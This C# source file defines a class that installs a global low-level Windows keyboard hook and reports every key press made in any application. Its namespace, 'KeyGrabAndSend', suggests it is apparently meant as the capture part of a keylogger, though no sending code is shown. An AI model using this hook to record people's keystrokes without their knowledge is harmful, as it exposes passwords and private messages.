using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace KeyGrabAndSend
{
    public static class KeyGrab
    {
        #region WinAPI imports
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        #endregion

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _Proc = HookCallback;
        private static IntPtr _HookID = IntPtr.Zero;

        public delegate void KeyPushedEventHandler(int KeyPushed);
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        public static event KeyPushedEventHandler KeyPushedEvent;

        /// <summary>
        /// Start grabbing key pushes
        /// </summary>
        public static void StartGrab()
        {
            _HookID = SetHook(_Proc);
        }

        /// <summary>
        /// Stop grabbing key pushes
        /// </summary>
        public static void StopGrab()
        {
            UnhookWindowsHookEx(_HookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // Get the key code
                int vkCode = Marshal.ReadInt32(lParam);
                
                // pass the event on if there is a subscriber
                if (KeyPushedEvent != null)
                {
                    KeyPushedEvent(vkCode);
                }
            }
            return CallNextHookEx(_HookID, nCode, wParam, lParam);
        }
    }
}
